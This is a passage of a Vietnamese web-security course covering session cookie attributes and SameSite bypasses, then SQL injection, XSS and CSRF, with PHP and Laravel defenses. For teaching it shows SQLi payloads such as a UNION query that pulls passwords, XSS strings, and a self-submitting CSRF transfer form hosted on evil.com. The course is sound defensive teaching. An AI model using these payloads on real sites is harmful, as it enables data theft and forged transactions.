  session bên trong `SessionGuard::updateSession`. Các starter kit và Fortify gọi thêm
  `$request->session()->regenerate()` sau login. Khi tự viết luồng xác thực mà không đi qua guard,
  phải tự gọi. Theo docs, CSRF token của Laravel cũng đổi mỗi khi session được regenerate.
- Logout trong Laravel: `Auth::logout()`, rồi `$request->session()->invalidate()` (xoá dữ liệu và
  đổi id) và `$request->session()->regenerateToken()` (đổi CSRF token).

#### Các thuộc tính của cookie

Một session cookie an toàn:

```
Set-Cookie: __Host-session=8f3a...; Path=/; Secure; HttpOnly; SameSite=Lax
```

| Thuộc tính | Tác dụng | Ghi chú |
|---|---|---|
| `Secure` | Chỉ gửi qua HTTPS (ngoại lệ localhost; riêng Safari không gửi cookie `Secure` tới `http://localhost`, theo MDN browser-compat-data) | Thiếu nó, kẻ nghe lén có thể dụ trình duyệt gửi cookie qua một request `http://` dù site chỉ chạy HTTPS |
| `HttpOnly` | JavaScript không đọc được qua `document.cookie` | Cookie vẫn được gửi kèm `fetch()`/XHR, xem nhóm cuối |
| `SameSite` | Có gửi kèm request cross-site hay không | Nhóm bên dưới |
| `Domain` | Có khai: gửi cho domain đó **và mọi subdomain**. Không khai: *host-only cookie*, chỉ gửi đúng host đã đặt | Không khai thì hẹp hơn, an toàn hơn. Không đặt được `Domain` là public suffix (`com`, `co.uk`, `github.io`) |
| `Path` | Chỉ gửi khi URL request khớp path này (và thư mục con) | Không khai thì mặc định là thư mục của URL đã đặt cookie. MDN lưu ý `Path` không phải cơ chế bảo mật: trang khác path trên cùng host vẫn đọc được |
| `Max-Age` / `Expires` | Thời gian sống. Có một trong hai là *persistent cookie*, lưu xuống đĩa | Có cả hai thì `Max-Age` thắng. Không có cả hai là *session cookie*, mất khi đóng trình duyệt (trừ khi trình duyệt khôi phục phiên) |

*Cookie prefix* là quy ước tên mà trình duyệt kiểm tra khi nhận cookie; sai điều kiện thì cookie bị
từ chối:

| Prefix | Điều kiện trình duyệt ép |
|---|---|
| `__Secure-` | Phải có `Secure`, đặt từ trang HTTPS |
| `__Host-` | Như trên, thêm: **không** có `Domain`, `Path=/` |
| `__Http-`, `__Host-Http-` | Prefix mới hơn: như `__Secure-` / `__Host-`, thêm yêu cầu `HttpOnly`, chứng minh cookie được đặt qua header chứ không phải JavaScript. Theo MDN browser-compat-data: Chrome và Edge từ bản 140, Firefox từ bản 143 (bản 142 chỉ nhận tên cũ `__HostHttp-`), Safari chưa hỗ trợ |

Tác dụng của `__Host-`: một subdomain (có thể bị chiếm, ví dụ qua subdomain takeover) không thể ghi
đè hay "cài" cookie này cho host chính, vì cookie có `Domain` sẽ bị từ chối. Đây chính là thứ chặn
bước 2 của session fixation qua subdomain. OWASP khuyến nghị `__Host-` cho session id. ⚠️ Trình duyệt
không hỗ trợ prefix thì cookie vẫn được nhận như cookie thường, nên prefix là lớp phòng thủ thêm,
không thay cho việc regenerate id.

Mapping sang `config/session.php` của Laravel 13:

| Thuộc tính | Key | Mặc định |
|---|---|---|
| Tên cookie | `cookie` (`SESSION_COOKIE`) | slug của `APP_NAME` + `-session`, ví dụ `laravel-session` |
| `Path` | `path` | `/` |
| `Domain` | `domain` (`SESSION_DOMAIN`) | `null` (host-only) |
| `Secure` | `secure` (`SESSION_SECURE_COOKIE`) | **không đặt**, tức không có `Secure` |
| `HttpOnly` | `http_only` | `true` |
| `SameSite` | `same_site` | `lax` |

⚠️ `SESSION_SECURE_COOKIE` không có giá trị mặc định là `true`: production chạy HTTPS phải tự đặt
`SESSION_SECURE_COOKIE=true`. Muốn dùng prefix `__Host-` thì đặt `SESSION_COOKIE=__Host-session`, giữ
`domain` là `null`, `path` là `/` và bật `secure`. Cookie của Laravel còn được mã hoá bởi middleware
`EncryptCookies`, nhưng mã hoá không thay thế được các thuộc tính trên: cookie mã hoá bị trộm vẫn dùng
được nguyên vẹn.

#### SameSite

Trước hết phải phân biệt *origin* và *site*, vì nhầm hai khái niệm này dẫn tới lỗ hổng thật:

- *Origin* = scheme + host + port, phải khớp chính xác.
- *Site* = scheme + *registrable domain* (còn gọi eTLD+1: một cấp ngay dưới public suffix, ví dụ
  `example.com`, `example.co.uk`). Định nghĩa hiện hành tính cả scheme (*schemeful same-site*), nên
  `http://` sang `https://` cùng domain là cross-site. Theo MDN browser-compat-data, Chrome áp dụng
  cho cookie từ bản 91, Firefox chỉ khi bật preference, Safari chưa áp dụng.

| Từ | Tới | Same-site? | Same-origin? |
|---|---|---|---|
| `https://example.com` | `https://example.com` | Có | Có |
| `https://app.example.com` | `https://intranet.example.com` | **Có** | Không (khác host) |
| `https://example.com` | `https://example.com:8080` | Có | Không (khác port) |
| `https://example.com` | `https://example.co.uk` | Không | Không |
| `https://example.com` | `http://example.com` | Không (khác scheme, theo schemeful same-site) | Không |

Request *cross-site* là request mà trang đang mở và đích đến khác site. `SameSite` quyết định cookie có
đi kèm request đó không:

| Giá trị | Gửi cookie với request cross-site khi nào |
|---|---|
| `Strict` | Không bao giờ, kể cả khi user bấm link từ site khác sang (user sẽ thấy như chưa đăng nhập ở trang đầu tiên) |
| `Lax` | Chỉ khi thoả **cả hai**: là *top-level navigation* (thanh địa chỉ đổi URL: bấm link, gán `location`, submit form) **và** dùng method an toàn (GET, HEAD...). Không gửi với `fetch()`, `<img>`, `<script>`, `<iframe>`, và không gửi với POST |
| `None` | Mọi lúc. Phải kèm `Secure`: Chrome, Edge và Firefox (từ bản 131) từ chối cookie `SameSite=None` thiếu `Secure` |

⚠️ "Không khai `SameSite` thì mặc định là `Lax`" **chỉ đúng với một số trình duyệt**. Theo bảng
tương thích của MDN:

| Trình duyệt | Lax mặc định |
|---|---|
| Chrome | Có, từ bản 80 (triển khai dần trong năm 2020, nâng mục tiêu lên 100% người dùng từ 08/2020) |
| Edge | Có, từ bản 86 |
| Firefox | Chỉ khi bật preference `network.cookie.sameSite.laxByDefault`, mặc định tắt |
| Safari | Không |

Trình duyệt không áp Lax mặc định coi cookie không khai `SameSite` như `None`. Thêm vào đó, Chrome
kèm một ngoại lệ gọi là *Lax+POST*: cookie **không khai** `SameSite` mà mới được đặt không quá 2 phút
vẫn được gửi kèm POST top-level cross-site. Ngoại lệ này tồn tại để không làm hỏng các luồng đăng nhập
SSO dùng POST (ví dụ IdP post form về app). Nó không áp cho cookie khai rõ `SameSite=Lax`. Chromium
ghi đây là biện pháp tạm thời sẽ bỏ vào một lúc nào đó, nên đừng thiết kế dựa vào nó.

Hệ quả: **luôn khai `SameSite` rõ ràng** cho mọi cookie quan trọng, và không coi mặc định của trình
duyệt là lớp chống CSRF (module 1.3). OWASP coi `SameSite` là lớp *defense in depth*, không thay CSRF
token.

Các cách vượt `SameSite` mà PortSwigger liệt kê, nên biết để không tin nhầm:

1. *Endpoint đổi state bằng GET*. `Lax` vẫn gửi cookie khi top-level navigation dùng GET, nên
   `document.location = 'https://bank.vn/transfer?to=hacker&amount=1000000'` từ site độc vẫn chạy
   với cookie của nạn nhân. Một số framework còn cho tham số kiểu `_method` ghi đè method khi routing;
   kiểm tra framework của bạn xử lý tham số này với request GET thế nào.
2. *Gadget trong chính site*. Với `Strict`, nếu site có một trang client-side redirect lấy đích từ
   tham số URL, kẻ tấn công dẫn nạn nhân tới trang đó, và request thứ hai do JavaScript của **chính
   site** tạo ra là same-site nên mang đủ cookie. Redirect phía server thì không vượt được, vì trình
   duyệt vẫn nhớ chuỗi bắt đầu từ cross-site.
3. *Subdomain anh em có lỗ hổng*. `app.example.com` và `blog.example.com` là same-site. XSS trên blog
   là gửi được request same-site tới app với đủ cookie, `SameSite` không có tác dụng gì. Tương tự với
   subdomain bị chiếm hoặc subdomain chứa nội dung do user upload.

#### HttpOnly không chống được XSS

Hiểu đúng `HttpOnly` làm gì: nó chặn **đọc** cookie từ JavaScript, nên script độc không lấy được
session id để mang sang máy khác dùng. Nhưng nó không làm XSS bớt nguy hiểm bao nhiêu:

- Script độc chạy ngay trong trang của bạn, cùng origin. Nó gọi `fetch('/api/transfer', {method:
  'POST', ...})`, trình duyệt tự kèm cookie (MDN ghi rõ cookie `HttpOnly` vẫn được gửi với request do
  JavaScript tạo), server thấy request hợp lệ.
- Nó đọc được mọi thứ hiển thị trên trang, kể cả CSRF token trong form hay thẻ `<meta>`, nên CSRF
  token cũng vô hiệu.
- Việc duy nhất kẻ tấn công mất là không thể dùng session **sau khi** nạn nhân đóng trang. Với phần
  lớn mục đích (đổi email, chuyển tiền, tạo API key), vậy là đủ.

Nên vẫn bật `HttpOnly` cho session cookie (Laravel bật sẵn), nhưng câu trả lời cho XSS là escape
output, sanitize và CSP (module 1.3), không phải thuộc tính cookie.

**Tóm tắt nhanh**

- Session id là credential tương đương password sau khi login: ≥ 64 bit entropy từ CSPRNG, chỉ đi qua
  cookie, huỷ ở server khi logout, có idle và absolute timeout thực thi ở server.
- Session fixation: kẻ tấn công cài id rồi đợi nạn nhân login. Sửa bằng regenerate id sau login và
  mỗi lần đổi quyền (`session_regenerate_id(true)`, bật `session.use_strict_mode`; Laravel
  `Auth::login` tự regenerate).
- Cookie session chuẩn: `__Host-` + `Secure` + `HttpOnly` + `SameSite` + `Path=/`, không `Domain`.
  Laravel: nhớ đặt `SESSION_SECURE_COOKIE=true`.
- Site ≠ origin: `a.example.com` và `b.example.com` là same-site, nên subdomain có lỗ hổng vượt được
  mọi mức `SameSite`.
- Lax mặc định chỉ có ở Chrome (80) và Edge (86); Firefox để sau preference, Safari không có. Kèm
  ngoại lệ Lax+POST 2 phút cho cookie không khai `SameSite`. Luôn khai rõ, và vẫn cần CSRF token.
- `HttpOnly` chặn đọc cookie, không chặn XSS gửi request bằng cookie đó.

**Nguồn**: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) ·
[MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) ·
[MDN browser-compat-data: Set-Cookie](https://github.com/mdn/browser-compat-data/blob/main/http/headers/Set-Cookie.json) ·
[Chromium: SameSite Updates](https://www.chromium.org/updates/same-site/) ·
[PortSwigger: Bypassing SameSite cookie restrictions](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) ·
[PHP: session_regenerate_id](https://www.php.net/manual/en/function.session-regenerate-id.php) ·
[PHP: Session runtime configuration](https://www.php.net/manual/en/session.configuration.php) ·
[Laravel: Regenerating the Session ID](https://laravel.com/docs/13.x/session#regenerating-the-session-id) ·
[Laravel 13 skeleton: config/session.php](https://github.com/laravel/laravel/blob/13.x/config/session.php)

---

### 1.3 Injection, XSS, CSRF

Module này trả lời: ba lỗ hổng web kinh điển hoạt động theo cơ chế nào, framework (Laravel) chặn sẵn
chỗ nào và **không** chặn chỗ nào, và vì sao XSS với CSRF nghe giống nhau nhưng khác hẳn nhau về
những gì kẻ tấn công làm được.

Điểm chung của cả ba: một bên (DB, trình duyệt, server) **nhầm dữ liệu thành lệnh** hoặc **nhầm người
gửi**. Injection và XSS là dữ liệu của user bị hiểu thành code (SQL, JavaScript); CSRF là request do
site khác tạo ra bị hiểu là do user chủ động gửi.

#### SQL injection

*SQL injection* (SQLi): input của user bị ghép vào câu SQL và DB hiểu nó như một phần của câu lệnh.

```php
// SAI: nối chuỗi
$db->query("SELECT * FROM users WHERE email = '$email'");
// $email = "' OR 1=1 -- "  →  WHERE email = '' OR 1=1 -- '   (trả về mọi user)
```

(Trong MySQL, `-- ` phải có khoảng trắng sau hai dấu gạch mới là comment; `#` cũng là comment.)

Kẻ tấn công làm được gì, theo PortSwigger:

| Dạng | Cách làm | Ví dụ |
|---|---|---|
| Lấy dữ liệu bị ẩn | Comment bỏ phần điều kiện còn lại | `category=Gifts'--` bỏ `AND released = 1` |
| Phá logic | Bỏ kiểm tra password | username `administrator'--`, password rỗng |
| UNION | Ghép kết quả một câu `SELECT` khác vào response | `' UNION SELECT username, password FROM users--` |
| Blind | Response không hiện kết quả; suy ra từng bit qua khác biệt response, lỗi có điều kiện, độ trễ thời gian (`SLEEP`), hoặc kênh ngoài (DNS lookup tới domain của hắn) | Dò từng ký tự của hash password |
| Second-order | Input được lưu an toàn vào DB, rồi **lần sau** được đọc ra và nối vào một câu SQL khác | Username `admin'--` lưu bằng prepared statement, sau đó job báo cáo nối nó vào SQL |

Second-order là lý do không được nghĩ "dữ liệu lấy từ DB của mình thì an toàn": nguồn gốc cuối cùng
vẫn là user.

*Prepared statement* (parameterized query) chặn được vì câu lệnh và dữ liệu đi **tách riêng**:

1. App gửi khung câu lệnh có placeholder: `SELECT * FROM users WHERE email = ?`.
2. DB parse và lập kế hoạch cho khung đó. Cấu trúc câu lệnh đã chốt.
3. App gửi giá trị. DB coi nó là một giá trị chuỗi duy nhất, dù trong đó có `'`, `OR` hay `--`.
   Input `' OR 1=1 -- ` chỉ tìm user có email đúng bằng chuỗi đó.

```php
<?php
declare(strict_types=1);

$pdo  = new PDO('mysql:host=127.0.0.1;dbname=app;charset=utf8mb4', 'app', 'secret', [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
]);
$stmt = $pdo->prepare('SELECT id, email FROM users WHERE email = ?');
$stmt->execute([$email]);
```

⚠️ PDO_MYSQL mặc định *emulate prepare*: PDO tự escape giá trị và ghép thành một chuỗi SQL ở phía
PHP rồi mới gửi, không phải bước 1 đến 3 ở trên. Vẫn an toàn khi charset khai trong DSN (như
`charset=utf8mb4` ở trên), nhưng lỗ hổng cổ điển xuất hiện khi đổi charset bằng `SET NAMES` thay vì
DSN. Laravel tắt emulate (native prepare). Chi tiết và bẫy `LIMIT ?` ở
[03-database-sql.md](03-database-sql.md#pdo).

⚠️ Prepared statement **không** giúp được ở những chỗ không phải là giá trị: tên cột, tên bảng, từ
khoá `ASC`/`DESC` trong `ORDER BY`. Placeholder chỉ thay được một *giá trị*, không thay được một phần
cú pháp. Với những chỗ này dùng *whitelist* (allow-list): chỉ nhận giá trị trong danh sách định sẵn,
hoặc đổi input thành kiểu không phải chuỗi (boolean, số, enum) rồi chọn chuỗi SQL cố định theo nó.

```php
<?php
declare(strict_types=1);

// Chỉ chấp nhận cột và hướng sắp xếp có trong danh sách
const SORTABLE = ['name' => 'name', 'created' => 'created_at'];

function orderClause(string $sort, string $dir): string
{
    $column    = SORTABLE[$sort] ?? 'id';
    $direction = $dir === 'desc' ? 'DESC' : 'ASC';   // input chỉ dùng để CHỌN, không bao giờ được nối
    return "ORDER BY {$column} {$direction}";
}

echo orderClause('created', 'desc'), PHP_EOL;          // ORDER BY created_at DESC
echo orderClause('1; DROP TABLE users', 'x'), PHP_EOL; // ORDER BY id ASC
```

PortSwigger nhấn mạnh thêm một quy tắc: chuỗi SQL truyền vào `prepare` phải **luôn là hằng** trong
code. Đừng quyết định từng trường hợp "biến này đáng tin nên nối được", vì nguồn gốc của dữ liệu rất
dễ đổi khi code khác thay đổi.

Trong Laravel:

- Query builder và Eloquent bind tham số qua PDO, nên `where('email', $email)` an toàn, không cần tự
  escape.
- ⚠️ Docs cảnh báo: PDO không bind được tên cột, nên **không bao giờ** để input của user quyết định tên
  cột, kể cả cột trong `orderBy`. `->orderBy($request->sort)` phải qua whitelist như trên.
- ⚠️ `DB::raw`, `selectRaw`, `whereRaw`, `havingRaw`, `orderByRaw`, `DB::statement`, `DB::select` với
  chuỗi tự nối: Laravel đưa nguyên văn vào câu SQL. Docs ghi rõ Laravel không bảo đảm query dùng raw
  expression được chống injection. Luôn dùng tham số bind thứ hai:
  `->whereRaw('price > ? AND stock > ?', [$min, $stock])`.

Lớp phòng thủ thêm (OWASP): *least privilege* cho tài khoản DB mà app dùng. Không cấp quyền admin hay
`DROP`; tách user DB cho từng ứng dụng; dùng view để giới hạn cột. Khi SQLi vẫn lọt, thiệt hại bị
giới hạn trong những gì tài khoản đó được phép. OWASP xếp "tự escape mọi input" vào nhóm **không
khuyến khích** vì phụ thuộc từng DB và dễ sót.

#### XSS (Cross-Site Scripting)

*XSS*: kẻ tấn công đưa được JavaScript (hoặc HTML) của hắn vào trang của bạn, và nó chạy trong trình
duyệt của người khác, với origin của bạn, tức với toàn bộ quyền của nạn nhân trên site. Hậu quả:
thao tác thay user, đọc dữ liệu trên trang, ghi lại thao tác bàn phím, hiện form đăng nhập giả ngay
trên domain thật.

Ba loại, phân theo nơi payload nằm:

| Loại | Payload nằm ở đâu | Ví dụ |
|---|---|---|
| *Stored* | Lưu trong DB, hiện cho mọi người xem trang | Bình luận chứa `<script>...</script>` |
| *Reflected* | Nằm trong request (URL), server in lại vào response | Trang tìm kiếm in "Kết quả cho: {q}" không escape; nạn nhân bấm link có `q` độc |
| *DOM-based* | JavaScript phía trình duyệt tự lấy dữ liệu (`location.hash`, `postMessage`...) và ghi vào DOM qua *sink* nguy hiểm, server không tham gia | `el.innerHTML = location.hash.slice(1)` |

Cách chặn chính là *output encoding* (escape khi xuất ra): đổi ký tự đặc biệt thành dạng trình duyệt
hiển thị như chữ chứ không thực thi. Quy tắc cốt lõi: **escape theo ngữ cảnh** nơi dữ liệu được đặt
vào, vì trình duyệt parse HTML, thuộc tính, JavaScript, URL, CSS theo những luật khác nhau. Escape
đúng cho ngữ cảnh này có thể vô dụng ở ngữ cảnh khác.

| Ngữ cảnh | Ví dụ | Cách xử lý |
|---|---|---|
| Nội dung HTML | `<div>DATA</div>` | HTML entity: `&` `<` `>` `"` `'` thành `&amp;` `&lt;` `&gt;` `&quot;` `&#x27;` |
| Thuộc tính HTML | `<input value="DATA">` | Entity encoding **và luôn đặt giá trị trong dấu nháy**. Thuộc tính không nháy thì một dấu cách là đủ thêm thuộc tính mới như `onmouseover=` |
| Trong JavaScript | `<script>var x = 'DATA';</script>` | Chỉ an toàn trong chuỗi có nháy, encode kiểu `\xHH`/`\uXXXX`. Tốt nhất đừng in dữ liệu vào script; truyền qua JSON đã encode hoặc thuộc tính `data-*` |
| URL | `<a href="/search?q=DATA">` | URL-encode giá trị tham số (`%HH`), rồi mới HTML-attribute encode cả URL |
| URL do user cung cấp | `<a href="DATA">` | Encoding không đủ: `javascript:alert(1)` không chứa ký tự đặc biệt nào. Phải kiểm tra scheme thuộc whitelist `http`/`https` |
| CSS | `style="width: DATA"` | Chỉ đặt vào giá trị thuộc tính CSS, validate chặt |

OWASP còn liệt kê các *dangerous context* mà dù encode vẫn không nên đặt dữ liệu vào: thẳng trong
thân `<script>` hay `<style>`, trong comment HTML, làm tên thẻ hay tên thuộc tính, trong event handler
(`onclick`...), và trong `eval()`, `setTimeout()` dạng chuỗi.

Trong PHP và Blade:

- `htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` là escape cho ngữ cảnh HTML và thuộc
  tính có nháy. Ví dụ `htmlspecialchars('<b onmouseover="x">\'', ENT_QUOTES | ENT_SUBSTITUTE,
  'UTF-8')` ra `&lt;b onmouseover=&quot;x&quot;&gt;&#039;`.
- Blade `{{ $x }}` đi qua helper `e()`, gọi đúng `htmlspecialchars` với các flag trên.
- ⚠️ `e()` trả nguyên giá trị nếu nó là `Htmlable` (ví dụ `HtmlString`). Bọc input của user trong
  `new HtmlString(...)` là tắt escape mà không có dấu `{!! !!}` nào để grep.
- Dữ liệu đưa vào `<script>`: dùng `{{ Js::from($data) }}`. Laravel encode JSON với các flag
  `JSON_HEX_TAG`, `JSON_HEX_APOS`, `JSON_HEX_AMP`, `JSON_HEX_QUOT`, nên `</script>` hay dấu nháy trong
  dữ liệu không phá được khối script.

Cho một đoạn Blade, chỉ ra từng chỗ lọt:

```blade
<p>{{ $comment->body }}</p>                    {{-- An toàn: ngữ cảnh HTML, đã escape --}}
<p>{!! $comment->body !!}</p>                  {{-- XSS: in nguyên, không escape --}}
<div class={{ $theme }}>                       {{-- XSS: thuộc tính không nháy; $theme = "x onmouseover=alert(1)" --}}
<a href="{{ $user->website }}">Website</a>     {{-- XSS: $user->website = "javascript:alert(1)" không bị escape đổi gì --}}
<script>var name = '{{ $user->name }}';</script> {{-- Sai ngữ cảnh: escape HTML không phải escape JS. Dùng Js::from --}}
<script>var cfg = {{ Js::from($config) }};</script> {{-- An toàn --}}
```

Và phía JavaScript (Vue, React, JS thuần), các *sink* hay lọt: `innerHTML`, `outerHTML`,
`document.write`, `insertAdjacentHTML`, Vue `v-html`, React `dangerouslySetInnerHTML`. OWASP còn lưu
ý React không tự xử lý URL `javascript:`/`data:` nếu bạn không validate riêng (hành vi thay đổi theo
phiên bản React, đừng dựa vào nó). Các sink an toàn vì coi dữ liệu là chữ: `textContent`,
`setAttribute` với tên thuộc tính cố định và vô hại, `value` của input, `createTextNode`.

*Rich text* (user được nhập HTML, như trình soạn thảo bài viết): escape sẽ làm hỏng định dạng, nên
phải *sanitize*: parse HTML rồi chỉ giữ lại các thẻ và thuộc tính trong whitelist. Dùng thư viện đã
được kiểm nghiệm (OWASP khuyến nghị DOMPurify ở JS; phía PHP thường dùng HTML Purifier). Không tự viết
regex. OWASP lưu ý: sanitize xong rồi sửa chuỗi đó thêm (hoặc đưa qua thư viện khác có biến đổi nó)
là mất tác dụng, và phải cập nhật thư viện sanitize thường xuyên vì bypass mới liên tục xuất hiện.

Các lớp phụ trợ:

- *CSP* (Content Security Policy, module 2.7): header báo trình duyệt chỉ chạy script từ nguồn cho
  phép. Dạng chặt thường dùng nonce hoặc hash cho từng script hợp lệ và cấm inline script, nên kể cả
  khi kẻ tấn công chèn được `<script>` thì trình duyệt cũng không chạy. Triển khai bằng
  `Content-Security-Policy-Report-Only` trước để xem cái gì sẽ bị chặn mà chưa làm hỏng trang. OWASP
  nhấn mạnh CSP là lớp thứ hai, không phải lớp chính.
- *Trusted Types* (OWASP chỉ ghi Chromium; theo MDN browser-compat-data hiện có ở Chrome và Edge
  từ bản 83, Safari 26, Firefox 148), bật bằng `Content-Security-Policy: require-trusted-types-for
  'script'`: các sink như `innerHTML` từ chối chuỗi thường, bắt mọi giá trị đi qua một policy đã
  duyệt. Đây là một trong ít biện pháp loại bỏ cả một lớp DOM XSS.
- API trả JSON phải có `Content-Type: application/json`, không phải `text/html`, nếu không trình
  duyệt mở thẳng URL đó có thể render JSON như HTML.
- WAF: OWASP không khuyến nghị dựa vào để chống XSS, vì bypass liên tục và hoàn toàn mù với DOM XSS.

#### CSRF (Cross-Site Request Forgery)

*CSRF*: site độc làm trình duyệt của nạn nhân gửi một request tới site của bạn. Trình duyệt **tự gửi
kèm cookie** của site đích, nên server không phân biệt được request thật với request bị giả mạo. Kẻ
tấn công không cần biết cookie, hắn chỉ cần trình duyệt nạn nhân gửi nó đi.

PortSwigger nêu ba điều kiện để CSRF khả thi:

1. Có một hành động đáng để kẻ tấn công kích hoạt (đổi email, đổi password, chuyển tiền, cấp quyền).
2. Server nhận diện user **chỉ** bằng cookie (hoặc credential khác trình duyệt tự gửi như HTTP Basic,
   client certificate).
3. Request không có tham số nào kẻ tấn công không đoán được. Ví dụ form đổi password có yêu cầu nhập
   password cũ thì không CSRF được.

Ví dụ: nạn nhân đang đăng nhập `bank.vn` rồi mở `evil.com`, trang này chứa:

```html
<form action="https://bank.vn/transfer" method="POST">
  <input type="hidden" name="to" value="hacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit();</script>
```

Form tự submit, cookie session của `bank.vn` đi kèm (nếu cookie không có `SameSite` phù hợp), lệnh
chuyển tiền chạy. Nếu endpoint nhận GET thì còn đơn giản hơn: một thẻ
`<img src="https://bank.vn/transfer?to=hacker&amount=1000000">` là đủ, thậm chí đặt ngay trong một bình
luận trên chính site đó.

⚠️ Vì vậy **GET không bao giờ được đổi state**. `GET /logout`, `GET /delete?id=1`,
`GET /subscribe?plan=pro` đều kích hoạt được bằng thẻ ảnh hay một link, và `SameSite=Lax` vẫn gửi
cookie với top-level navigation dạng GET.

Các cách chặn (OWASP CSRF Prevention Cheat Sheet):

1. **Dùng cơ chế có sẵn của framework** trước khi tự viết.
2. *Synchronizer token* (cho app có session ở server): server sinh token ngẫu nhiên, lưu trong
   session, nhúng vào form (`<input type="hidden">`) hoặc gửi qua header tuỳ chỉnh. Request đổi state
   phải mang token và server so với bản trong session. Site khác không đọc được trang của bạn (same-
   origin policy) nên không biết token. Token có thể theo session hoặc theo request; theo request an
   toàn hơn chút nhưng hay gây lỗi khi user bấm Back. Không đặt token trong URL (lộ qua log,
   `Referer`).
3. *Signed double-submit cookie* (cho app stateless): token nằm trong một cookie, và client gửi lại
   nó qua header hoặc tham số form; server kiểm tra hai giá trị khớp **và** chữ ký HMAC hợp lệ. Chữ
   ký phải gắn với dữ liệu riêng của phiên (ví dụ session id), nếu không kẻ tấn công cài được cookie
   (qua subdomain, qua HTTP thường) sẽ tự tạo cặp hợp lệ. Bản *naive* (chỉ so cookie với tham số, không
   ký) OWASP xếp vào nhóm không khuyến khích vì lý do đó.
4. *Fetch Metadata*: trình duyệt hiện đại tự gắn header `Sec-Fetch-Site` với giá trị `same-origin`,
   `same-site`, `cross-site` hoặc `none` (user tự gõ URL, bookmark). Chính sách cơ bản: từ chối method
   không an toàn (POST/PUT/PATCH/DELETE) khi `Sec-Fetch-Site: cross-site`; cho qua `same-origin`; chỉ
   tin `same-site` khi bạn tin mọi subdomain. Header chỉ được gửi tới URL "đáng tin" (HTTPS,
   localhost), nên OWASP coi việc có phương án dự phòng (kiểm tra `Origin` hoặc token) cho trình duyệt
   cũ là **bắt buộc**. Go từ 1.25 có sẵn `http.CrossOriginProtection` theo hướng này.
5. *Kiểm tra `Origin`/`Referer`*: so origin nguồn với origin của chính bạn (lấy từ cấu hình là cách an
   toàn nhất). ⚠️ So cả origin, đừng so tiền tố: `example.org.attacker.com` không được lọt qua phép
   kiểm tra dành cho `example.org`.
6. *Header tuỳ chỉnh cho AJAX/API*: request có header lạ (`X-CSRF-Token`, `X-Requested-With`...) bị
   trình duyệt bắt *preflight* CORS khi gửi cross-origin, và nếu server không cho phép origin đó thì
   request thật không bao giờ được gửi. ⚠️ Chỉ đúng khi CORS cấu hình chặt: cho `Access-Control-Allow-
   Credentials: true` với danh sách origin rộng (hoặc regex mọi subdomain) là tự phá lớp này.
7. `SameSite` khai rõ ràng cho session cookie (module 1.2): lớp defense in depth, không thay token.

Hai chỗ hay bị bỏ quên:

- *Login CSRF*: kẻ tấn công đăng nhập trình duyệt nạn nhân vào **tài khoản của hắn**. Nạn nhân không
  để ý, lưu thẻ tín dụng hay lịch sử tìm kiếm vào tài khoản đó, và hắn đọc được. Form login cũng cần
  CSRF token (dùng session trước đăng nhập, và regenerate session khi login thành công).
- ⚠️ API chỉ nhận `Authorization: Bearer <token>` (không đọc cookie) thì không bị CSRF kiểu cổ điển,
  vì trình duyệt không tự gắn header này; script ở site khác muốn gắn thì phải biết token. Nhưng chỉ
  cần API đó **cũng** chấp nhận cookie session (như Sanctum ở chế độ SPA) là quay lại cần CSRF.

*Client-side CSRF* (OWASP gọi là biến thể mới, quan trọng): JavaScript của **chính site bạn** lấy
input do kẻ tấn công kiểm soát (URL fragment, `window.name`, `postMessage`) để dựng request. Request
đó đi từ origin của bạn, kèm đủ CSRF token và cookie, nên token lẫn `SameSite` đều vô dụng. Phòng: đừng
để endpoint hay method của request phụ thuộc vào input kiểu này, hoặc chỉ chọn từ danh sách định sẵn.

Ví dụ signed double-submit tối giản bằng PHP thuần (minh hoạ cơ chế; trong Laravel hãy dùng middleware
có sẵn):

```php
<?php
declare(strict_types=1);

// Token = HMAC(secret, độ dài + session id + random) . "." . random
function makeCsrfToken(string $secret, string $sessionId): string
{
    $random  = bin2hex(random_bytes(32));
    $message = strlen($sessionId) . '!' . $sessionId . '!' . strlen($random) . '!' . $random;
    return hash_hmac('sha256', $message, $secret) . '.' . $random;
}

function verifyCsrfToken(string $secret, string $sessionId, string $token): bool
{
    $parts = explode('.', $token, 2);
    if (count($parts) !== 2) {
        return false;
    }
    [$mac, $random] = $parts;
    $message  = strlen($sessionId) . '!' . $sessionId . '!' . strlen($random) . '!' . $random;
    $expected = hash_hmac('sha256', $message, $secret);
    return hash_equals($expected, $mac);     // so constant-time
}

$secret = random_bytes(32);
$token  = makeCsrfToken($secret, 'sess-123');
var_dump(verifyCsrfToken($secret, 'sess-123', $token)); // bool(true)
var_dump(verifyCsrfToken($secret, 'sess-999', $token)); // bool(false): token gắn với session khác
```

Laravel 13: middleware `PreventRequestForgery` nằm sẵn trong group `web`, chạy theo hai lớp (theo docs
CSRF Protection):

1. Method đọc (GET, HEAD, OPTIONS) cho qua.
2. Kiểm tra `Sec-Fetch-Site`: `same-origin` thì cho qua ngay, không cần token.
3. Không qua được bước 2 (trình duyệt cũ không gửi header, hoặc không chạy HTTPS) thì rơi về kiểm
   tra token truyền thống: `_token` trong form (`@csrf` sinh sẵn), hoặc header `X-CSRF-TOKEN`, hoặc
   `X-XSRF-TOKEN` (giá trị lấy từ cookie mã hoá `XSRF-TOKEN` mà Axios, Angular tự đọc và gửi). Sai thì
   HTTP 419.

Tuỳ chọn trong `bootstrap/app.php`: `preventRequestForgery(originOnly: true)` bỏ hẳn fallback token (sai
origin trả 403), `allowSameSite: true` cho phép cả request same-site từ subdomain, `except: [...]` loại
trừ URI. ⚠️ Mỗi URI trong `except` (thường là webhook) phải có cơ chế xác thực riêng, ví dụ chữ ký
HMAC của nhà cung cấp; tốt hơn nữa là đặt webhook ngoài group `web`. CSRF middleware tự tắt khi chạy
test, nên test xanh không chứng minh form có `@csrf`.

#### XSS khác CSRF thế nào

| | XSS | CSRF |
|---|---|---|
| Kẻ tấn công làm được gì | Chạy JS trong origin của bạn: gửi request bất kỳ **và đọc response**, đọc DOM, token, dữ liệu trên trang | Chỉ khiến trình duyệt **gửi** request; không đọc được response (same-origin policy chặn) |
